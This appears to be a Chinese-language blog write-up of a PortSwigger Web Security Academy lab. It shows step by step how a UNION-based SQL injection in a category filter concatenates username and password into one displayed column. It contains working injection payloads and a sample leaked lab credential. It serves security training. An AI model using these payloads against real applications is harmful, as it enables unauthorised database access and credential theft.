---
title: "SQL injection（Lab6)"
published: 2026-10-15
description: "PortSwigger SQLi 入门：单列拼接取多值 Lab：SQL injection UNION attack, retri …"
category: "靶场"
---

# PortSwigger SQLi 入门：单列拼接取多值

> Lab：[SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)  
> 原理：[Retrieving multiple values within a single column](https://portswigger.net/web-security/sql-injection/union-attacks#retrieving-multiple-values-within-a-single-column)

## 题目在考什么

有时能回显的文本列只有一列，却要一次拿出 `username` + `password`。做法是在那一列里用数据库的字符串拼接，把多字段合成一格再显示。

## 注入点

类别筛选 `category`。

## 步骤

### 1\. 定列数

```text
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

到 3 报错 → **2 列**。

### 2\. 找能塞字符串的列

```text
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```

第二列能显示 `a` → **只往第二列塞文本**。

### 3\. 单列拼接多值

Oracle 用 `||` 拼接，中间加分隔符方便认：

```text
' UNION SELECT NULL,username||'~'||password FROM users--
```

页面出现类似：

```text
administrator~d5zlwven1j9b76z8g28w
```

![](https://pic.npiter.de/file/1792049581759_20261015153259577.png)

用 `administrator` 和密码登录，lab 通过。

![](https://pic.npiter.de/file/1792049590442_20261015153259578.png)

## 要点

-   上一题两列都能显示时，可以直接 `SELECT username, password`；本题只有一列能显示，就要拼接。
-   分隔符自定（`~`、`|` 等）；不同库拼接写法不同（Oracle `||`，有的用 `CONCAT`）。
-   `NULL` 占住不能放字符串的那一列。
